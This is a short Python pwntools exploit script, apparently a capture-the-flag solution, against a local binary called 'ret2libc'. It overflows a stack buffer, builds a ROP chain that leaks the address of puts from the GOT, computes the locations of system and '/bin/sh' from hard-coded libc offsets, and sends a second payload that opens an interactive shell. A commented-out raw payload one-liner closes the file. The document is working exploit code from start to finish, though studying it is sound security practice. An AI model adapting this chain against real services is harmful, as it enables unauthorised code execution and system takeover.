from pwn import *
p = process("./ret2libc")
e = ELF("./ret2libc")

#for symbol in e.symbols:
#	print symbol, hex(e.symbols[symbol])

puts_plt = e.symbols['plt.puts']
puts_got = e.symbols['got.puts']
read_got = e.symbols['got.read']
vuln = e.symbols['vuln']

buff = "A"*(96+8)
pop_rdi = int("0x4006a3", 16) # get from ropper tool

payload = buff+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)

p.sendline(payload)

data = p.recvuntil("No shell for you :(\n")
data = p.recv(6)+'\x00\x00'
#print hex(u64(data)) # real address in libc of puts

# after get leaked 3 last digits in address of puts => search for libc version: https://libc.blukat.me/ => get offset of others 
puts_offset = 0x06f690
system_offset = 0x045390
binsh_offset = 0x18cd57

puts_addr = u64(data)
system_addr = puts_addr - puts_offset + system_offset
binsh_addr = puts_addr - puts_offset + binsh_offset

#print puts_addr, system_addr, binsh_addr
#print hex(puts_addr), hex(system_addr), hex(binsh_addr)

payload = buff+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload)
p.interactive()
#r <<< $(python -c "print 'A'*104+'\x93\x06\x40'+'\x00'*5+'\x3f\x07\x40'+'\x00'*5+'\xb0\x04\x40'+'\x00'*5")
